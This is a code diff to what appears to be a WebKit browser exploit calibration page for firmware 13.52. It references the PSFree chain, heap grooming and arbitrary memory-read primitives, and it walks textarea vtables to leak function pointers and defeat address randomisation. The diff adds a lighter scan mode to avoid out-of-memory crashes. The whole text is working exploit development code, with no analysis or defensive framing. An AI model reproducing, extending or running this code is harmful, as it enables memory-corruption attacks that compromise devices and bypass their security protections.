@@ -33,9 +33,15 @@ let walkQuiet = false;
 const calRetain = [];
 
 const LOG_MAX = 300;
-const BUILD_ID = "cal-20250830e";
+const BUILD_ID = "cal-20250830f";
 const WEBKIT_CODE_PROLOGUE = 0xe5894855;
 const VTABLE_EXT_SLOTS = 48;
+/** 2e lite — fewer vtable slot reads (OOM-safe on 13.52 HW) */
+const VTABLE_EXT_SLOTS_LITE = parseInt(params.get("vtslots") || "20", 10);
+/** Page probes during vtable score — 48 OOMs; lite uses 4 */
+const VTABLE_WALK_PROBE = parseInt(params.get("vtprobe") || "4", 10);
+/** ?full=1 or ?vtable=full — heavy chain scan (OOM risk) */
+const VTABLE_2E_FULL = params.get("full") === "1" || params.get("vtable") === "full";
 const crashLog = createCrashLog({
     ssLog: "wk-cal-log",
     ssState: "wk-cal-state",
@@ -231,6 +237,20 @@ function preCalTrim() {
     }
     if (pinnedLines.length > 8)
         pinnedLines.splice(0, pinnedLines.length - 8);
+}
+
+async function yieldCal(ms) {
+    preCalTrim();
+    await new Promise(function (r) { setTimeout(r, ms != null ? ms : 64); });
+    try {
+        if (!exploit) {
+            const core = await import("./core.js");
+            exploit = { establishPrimitive: core.establishPrimitive, installWindowP,
+                trimExploitDebris: core.trimExploitDebris };
+        }
+        if (exploit.trimExploitDebris)
+            exploit.trimExploitDebris();
+    } catch (_) { }
 }
 
 async function freeCalMemory() {
@@ -517,7 +537,8 @@ function isMappedRead(p, addr) {
 
 function countWalkMappedPages(p, startPtr, maxProbe, backward) {
     let mapped = 0;
-    for (let step = 0; step < maxProbe; step++) {
+    const cap = maxProbe > 0 ? maxProbe : 0;
+    for (let step = 0; step < cap; step++) {
         const page = walkPageFrom(startPtr, step, backward);
         if (!page) break;
         const probe = (step === 0) ? startPtr : page;
@@ -528,7 +549,8 @@ function countWalkMappedPages(p, startPtr, maxProbe, backward) {
     return mapped;
 }
 
-function scoreVtableCandidate(p, vt) {
+function scoreVtableCandidate(p, vt, opts) {
+    opts = opts || {};
     if (!plausibleModulePtr(vt)) return -1;
     let codeEntries = 0;
     for (let i = 0; i < 4; i++) {
@@ -538,27 +560,35 @@ function scoreVtableCandidate(p, vt) {
     }
     if (codeEntries < 2) return -1;
     if (!isMappedRead(p, vt)) return -1;
-    const walkBack = countWalkMappedPages(p, vt, 48, true);
-    const walkFwd = countWalkMappedPages(p, vt, 8, false);
+    if (opts.skipWalk) return codeEntries * 10 + 50;
+    const maxProbe = opts.maxProbe != null ? opts.maxProbe : VTABLE_WALK_PROBE;
+    const walkBack = countWalkMappedPages(p, vt, maxProbe, true);
+    const walkFwd = countWalkMappedPages(p, vt, Math.min(maxProbe, 8), false);
     if (walkBack < 2 && walkFwd < 1) return -1;
     return codeEntries * 10 + walkBack + walkFwd;
 }
 
-function tryWebcoreVtable(p, path, webcore, implOff, vtOff, labelExtra) {
-    mark("WEBCORE-TRY", path.label + (labelExtra || "") + " impl+0x"
-        + implOff.toString(16) + " webcore="
-        + (webcore ? String(webcore) : "null"));
+function tryWebcoreVtable(p, path, webcore, implOff, vtOff, labelExtra, opts) {
+    opts = opts || {};
+    const quiet = !!opts.quiet;
+    if (!quiet) {
+        mark("WEBCORE-TRY", path.label + (labelExtra || "") + " impl+0x"
+            + implOff.toString(16) + " webcore="
+            + (webcore ? String(webcore) : "null"));
+    }
     if (!webcore) return null;
 
     const vt = read8p(p, webcore.add32(vtOff));
     const e0 = vt ? read4p(p, vt) : null;
-    mark("WEBCORE-TRY", path.label + " vt+0x" + vtOff.toString(16) + " vtable="
-        + (vt ? String(vt) : "read-fail") + " entry0=" + fmtMagic(e0));
+    if (!quiet) {
+        mark("WEBCORE-TRY", path.label + " vt+0x" + vtOff.toString(16) + " vtable="
+            + (vt ? String(vt) : "read-fail") + " entry0=" + fmtMagic(e0));
+    }
 
     if (!vt || !plausibleModulePtr(vt)) return null;
     if (!looksLikeNativeCode(e0) && isBadRead(e0)) return null;
 
-    const score = scoreVtableCandidate(p, vt);
+    const score = scoreVtableCandidate(p, vt, opts);
     if (score < 0 && !(implOff === 0x18 && vtOff === 0)) return null;
 
     return {
@@ -570,11 +600,12 @@ function tryWebcoreVtable(p, path, webcore, implOff, vtOff, labelExtra) {
         vtable: vt,
         entry0: read8p(p, vt),
         score: score >= 0 ? score : 50,
-        walkBack: countWalkMappedPages(p, vt, 48, true),
+        walkBack: opts.skipWalk ? 0 : countWalkMappedPages(p, vt, opts.maxProbe || VTABLE_WALK_PROBE, true),
     };
 }
 
-function collectTextareaCells(p, carrier) {
+function collectTextareaCells(p, carrier, opts) {
+    opts = opts || {};
     const cells = [];
     const seen = new Set();
     const add = (label, cell) => {
@@ -595,19 +626,23 @@ function collectTextareaCells(p, carrier) {
     if (carrier && carrier.textareaAddress > 0 && Number.isFinite(carrier.textareaAddress)) {
         add("carrier.textareaAddress", addrFromNumber(carrier.textareaAddress));
     }
-    try {
-        const fresh = document.createElement("textarea");
-        calRetain.push(fresh);
-        add("leakval(fresh.textarea)", p.leakval(fresh));
-    } catch (err) {
-        mark("VTABLE-WARN", "leakval(fresh.textarea): " + err.message);
+    if (!opts.noFresh) {
+        try {
+            const fresh = document.createElement("textarea");
+            calRetain.push(fresh);
+            add("leakval(fresh.textarea)", p.leakval(fresh));
+        } catch (err) {
+            mark("VTABLE-WARN", "leakval(fresh.textarea): " + err.message);
+        }
     }
 
-    if (cells.length >= 2) {
-        mark("TEXTAREA-CELL", cells[0].label + "=" + cells[0].cell
-            + " | " + cells[1].label + "=" + cells[1].cell);
-    } else if (cells.length === 1) {
-        mark("TEXTAREA-CELL", cells[0].label + "=" + cells[0].cell);
+    if (!opts.quiet) {
+        if (cells.length >= 2) {
+            mark("TEXTAREA-CELL", cells[0].label + "=" + cells[0].cell
+                + " | " + cells[1].label + "=" + cells[1].cell);
+        } else if (cells.length === 1) {
+            mark("TEXTAREA-CELL", cells[0].label + "=" + cells[0].cell);
+        }
     }
     return cells;
 }
@@ -629,15 +664,59 @@ function pushVtableHit(hits, seen, hit) {
     hits.push(hit);
 }
 
-function discoverTextareaVtableChains(p, carrier) {
+function discoverTextareaVtableChainsLite(p, carrier) {
+    const vtOpts = { skipWalk: true, quiet: true, maxProbe: 0 };
+    const cells = collectTextareaCells(p, carrier, { noFresh: true, quiet: true });
+    if (!cells.length) {
+        mark("VTABLE-FAIL", "no textarea JSObject — re-run Start");
+        return [];
+    }
+
+    const hits = [];
+    const seen = new Set();
+    const path = cells[0];
+
+    const psfree = probePsFreeTextareaChainQuiet(p, path.cell, path.label);
+    if (psfree) {
+        psfree.walkBack = 0;
+        pushVtableHit(hits, seen, psfree);
+        mark("VTABLE-OK", psfree.label + " vtable=" + psfree.vtable + " (lite/psfree)");
+        return hits;
+    }
+
+    for (let ii = 0; ii < 2; ii++) {
+        const implOff = ii === 0 ? 0x18 : 0x8;
+        const webcore = read8p(p, path.cell.add32(implOff));
+        if (!webcore) continue;
+        const hit = tryWebcoreVtable(p, path, webcore, implOff, 0, "", vtOpts);
+        if (hit) pushVtableHit(hits, seen, hit);
+    }
+
+    hits.sort(function (a, b) { return (b.score || 0) - (a.score || 0); });
+    if (hits.length) {
+        mark("VTABLE-OK", hits[0].label + " vtable=" + hits[0].vtable + " (lite)");
+    } else {
+        mark("VTABLE-FAIL", "lite miss — try ?full=1 (OOM risk) or ?g=512 groom");
+    }
+    return hits;
+}
+
+function discoverTextareaVtableChains(p, carrier, opts) {
+    opts = opts || {};
+    if (opts.lite !== false && !VTABLE_2E_FULL)
+        return discoverTextareaVtableChainsLite(p, carrier);
+
+    const walkOpts = { maxProbe: VTABLE_WALK_PROBE };
     const cells = collectTextareaCells(p, carrier);
     if (cells.length === 0) {
         mark("VTABLE-FAIL", "no textarea JSObject — re-run Start");
         return [];
     }
 
-    for (let ci = 0; ci < cells.length; ci++)
-        logCellSlots(p, cells[ci].cell, cells[ci].label);
+    if (!walkQuiet) {
+        for (let ci = 0; ci < cells.length; ci++)
+            logCellSlots(p, cells[ci].cell, cells[ci].label);
+    }
 
     const hits = [];
     const seen = new Set();
@@ -646,6 +725,7 @@ function discoverTextareaVtableChains(p, carrier) {
         const path = cells[ci];
         const psfree = probePsFreeTextareaChain(p, path.cell, path.label);
         if (psfree) {
+            psfree.walkBack = countWalkMappedPages(p, psfree.vtable, VTABLE_WALK_PROBE, true);
             mark("VTABLE-CAND", "PSFree chain vtable=" + psfree.vtable
                 + " walkBack=" + psfree.walkBack);
             pushVtableHit(hits, seen, psfree);
@@ -656,7 +736,7 @@ function discoverTextareaVtableChains(p, carrier) {
             const webcore = read8p(p, path.cell.add32(implOff));
             if (!webcore) continue;
             for (let vtOff = 0; vtOff <= 0x10; vtOff += 8) {
-                const hit = tryWebcoreVtable(p, path, webcore, implOff, vtOff, "");
+                const hit = tryWebcoreVtable(p, path, webcore, implOff, vtOff, "", walkOpts);
                 if (!hit) continue;
                 mark("VTABLE-CAND", hit.label + " vtable=" + hit.vtable + " score=" + hit.score);
                 pushVtableHit(hits, seen, hit);
@@ -665,9 +745,9 @@ function discoverTextareaVtableChains(p, carrier) {
 
         const bfly = read8p(p, path.cell.add32(0x8));
         if (!bfly || !plausibleHeapPtr(bfly)) continue;
-        for (let slot = 0; slot < 32; slot++) {
+        for (let slot = 0; slot < 16; slot++) {
             const webcore = read8p(p, bfly.add32(slot * 8));
-            const hit = tryWebcoreVtable(p, path, webcore, 0x8, 0, "/bfly" + slot);
+            const hit = tryWebcoreVtable(p, path, webcore, 0x8, 0, "/bfly" + slot, walkOpts);
             if (!hit) continue;
             mark("VTABLE-CAND", hit.label + " webcore=" + webcore
                 + " vtable=" + hit.vtable + " score=" + hit.score);
@@ -815,14 +895,19 @@ function ptrLooksWebkitInterior(fnPtr, webkitBase) {
     return (fl - lo) < 0x1500000;
 }
 
-/** All vtable chains → external fn ptrs (48 slots each, skips webkit interior). */
-function collectExtPtrsFromVtableHits(p, hits, webkitBase) {
+/** All vtable chains → external fn ptrs (skips webkit interior). */
+async function collectExtPtrsFromVtableHits(p, hits, webkitBase, opts) {
+    opts = opts || {};
+    const slots = opts.slots != null ? opts.slots : VTABLE_EXT_SLOTS;
+    const yieldEvery = opts.yieldEvery != null ? opts.yieldEvery : 0;
     const out = [];
     const seen = new Set();
     for (let hi = 0; hi < hits.length; hi++) {
         const hit = hits[hi];
         if (!hit || !hit.vtable) continue;
-        for (let i = 0; i < VTABLE_EXT_SLOTS; i++) {
+        for (let i = 0; i < slots; i++) {
+            if (yieldEvery > 0 && i > 0 && i % yieldEvery === 0)
+                await yieldCal(16);
             const ei = read8p(p, hit.vtable.add32(i * 8));
             if (!ei || ei.hi < 0x8) continue;
             if (webkitBase && ptrLooksWebkitInterior(ei, webkitBase)) continue;
@@ -842,18 +927,22 @@ function collectExtPtrsFromVtableHits(p, hits, webkitBase) {
     return out;
 }
 
-function logVtableExtPtrs(p, hit) {
+function logVtableExtPtrs(p, hit, opts) {
+    opts = opts || {};
+    const slots = opts.slots != null ? opts.slots : VTABLE_EXT_SLOTS;
+    const quiet = !!opts.quiet;
     if (!hit || !hit.vtable) return 0;
     const saved = [];
     let n = 0;
-    for (let i = 0; i < VTABLE_EXT_SLOTS; i++) {
+    for (let i = 0; i < slots; i++) {
         const ei = read8p(p, hit.vtable.add32(i * 8));
         if (!ei || ei.hi < 0x8) continue;
         const code = read4p(p, ei);
         if (isBadRead(code)) continue;
         if (isWebkitExtCode(code >>> 0)) continue;
         const ptrHex = ptrNum(ei).toString(16);
-        mark("EXT-PTR", "vtable[" + i + "]=" + ei + " code=" + fmtMagic(code));
+        if (!quiet)
+            mark("EXT-PTR", "vtable[" + i + "]=" + ei + " code=" + fmtMagic(code));
         saved.push({ label: "vtable[" + i + "]", ptr: ptrHex, code: fmtMagic(code) });
         n++;
     }
@@ -887,7 +976,7 @@ function probePsFreeTextareaChain(p, cell, label) {
         vtable: vt0,
         entry0: read8p(p, vt0),
         score: 100,
-        walkBack: countWalkMappedPages(p, vt0, 48, true),
+        walkBack: countWalkMappedPages(p, vt0, VTABLE_WALK_PROBE, true),
     };
 }
 
@@ -1963,14 +2052,28 @@ async function walkOneAnchorChunk(p, anchor, label, startStep, chunkSteps, backw
 }
 
 async function runExtLkAutoScan(p, hits, best, webkitBase, off) {
-    const chainExt = collectExtPtrsFromVtableHits(p, hits, webkitBase);
-    mark("LK-EXT-SCAN", "chain ext ptrs=" + chainExt.length + " (all cells/impl/bfly)");
-    const live = collectLiveVtableExtPtrs(p, webkitBase, off, {
-        carrier: carrierRef,
-        retain: calRetain,
-        vtableEntries: VTABLE_EXT_SLOTS,
-        cellMax: 4,
+    const slots = VTABLE_2E_FULL ? VTABLE_EXT_SLOTS : VTABLE_EXT_SLOTS_LITE;
+    const scanHits = VTABLE_2E_FULL ? hits : hits.slice(0, 1);
+    const chainExt = await collectExtPtrsFromVtableHits(p, scanHits, webkitBase, {
+        slots: slots,
+        yieldEvery: 8,
     });
+    mark("LK-EXT-SCAN", "chain ext ptrs=" + chainExt.length
+        + " slots=" + slots + " chains=" + scanHits.length);
+
+    let liveEntries = [];
+    if (chainExt.length < 2 && !VTABLE_2E_FULL) {
+        await yieldCal(32);
+        const live = collectLiveVtableExtPtrs(p, webkitBase, off, {
+            carrier: carrierRef,
+            retain: calRetain,
+            vtableEntries: slots,
+            cellMax: 1,
+            noFresh: true,
+        });
+        liveEntries = live.entries || [];
+        mark("LK-EXT-SCAN", "live add-on n=" + liveEntries.length);
+    }
     let sessionEntries = [];
     try {
         const raw = sessionStorage.getItem("wk-cal-ext-ptrs");
@@ -1985,9 +2088,10 @@ async function runExtLkAutoScan(p, hits, best, webkitBase, off) {
         merged.push({ label: e.label || "ext", hex: hex, ptr: hex, code: e.code || null });
     }
     for (let i = 0; i < chainExt.length; i++) addEntry(chainExt[i]);
-    for (let i = 0; i < live.entries.length; i++) addEntry(live.entries[i]);
+    for (let i = 0; i < liveEntries.length; i++) addEntry(liveEntries[i]);
     for (let j = 0; j < sessionEntries.length; j++) addEntry(sessionEntries[j]);
 
+    await yieldCal(32);
     mark("LK-EXT-SCAN", "merged n=" + merged.length + " — 0-read vote…");
     for (let ci = 0; ci < merged.length && ci < 10; ci++) {
         mark("LK-EXT-CAND", merged[ci].label + " " + merged[ci].hex
@@ -2056,8 +2160,11 @@ async function walkVtableForBase() {
         return false;
     }
 
+    mark("2E-START", VTABLE_2E_FULL ? "full scan (OOM risk)" : "lite scan slots=" + VTABLE_EXT_SLOTS_LITE);
+    await yieldCal(48);
+
     walkQuiet = true;
-    const hits = discoverTextareaVtableChains(p, carrierRef);
+    const hits = discoverTextareaVtableChains(p, carrierRef, { lite: !VTABLE_2E_FULL });
     walkQuiet = false;
 
     if (!hits.length) {
@@ -2066,6 +2173,8 @@ async function walkVtableForBase() {
         return false;
     }
 
+    await yieldCal(32);
+
     hits.sort(function (a, b) { return (b.score || 0) - (a.score || 0); });
     const best = hits[0];
     vtableHit = best;
@@ -2073,8 +2182,13 @@ async function walkVtableForBase() {
     try { sessionStorage.setItem(SS_VTABLE_PTR, String(best.vtable)); } catch (_) { }
 
     mark("VTABLE-OK", best.label + " vtable=" + best.vtable + " chains=" + hits.length);
-    const extN = logVtableExtPtrs(p, best);
-    mark("LK-EXT-SCAN", extN + " EXT-PTR from best — scanning " + hits.length + " chains…");
+    const extN = logVtableExtPtrs(p, best, {
+        slots: VTABLE_2E_FULL ? VTABLE_EXT_SLOTS : VTABLE_EXT_SLOTS_LITE,
+        quiet: true,
+    });
+    mark("LK-EXT-SCAN", extN + " EXT-PTR from best — lk vote next…");
+
+    await yieldCal(32);
 
     const synced = syncBasesLikeRw();
     const off = synced.off;
@@ -2430,7 +2544,7 @@ function init() {
     mark("BOOT", "build=" + BUILD_ID + " — logs persist across reload/crash");
     mark("BOOT", "index_cal.html — expm1 / vtable for 13.52");
     mark("BOOT", groomBootLine());
-    mark("BOOT", "2e = one tap: vtable leak + ext→lk auto (?vtable=1 runs after Start)");
+    mark("BOOT", "2e lite OOM-safe — ?full=1 for heavy scan; ?vtslots=24 more ext slots");
     wireGroomBar();
     setUi();
     renderOut();
